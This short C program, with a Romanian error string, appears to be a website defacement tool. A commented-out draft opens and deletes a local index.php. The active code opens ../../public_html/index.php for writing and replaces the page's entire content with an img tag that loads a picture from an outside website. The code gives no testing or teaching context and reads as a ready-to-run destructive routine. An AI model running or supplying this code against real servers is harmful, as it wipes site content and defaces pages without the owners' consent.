/*#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
int
main (void)
{
  FILE *f=fopen("./index.php","r");
  if(!f){
      puts("Eroare");
  }
  /*int x=remove("./index.php");
  printf("%d",x);
  return 0;
}
*/
#include <stdio.h>
#include <sys/types.h>
#include <dirent.h>
int
main (void)
{

  FILE *f=fopen("../../public_html/index.php","w");
  fprintf(f,"<img width=\'500\' src=\'http://freedomsdisciple.com/wp-content/uploads/2015/05/0fd5809b02469076e4a5fb8653184b07.jpg\'>");

  return 0;
}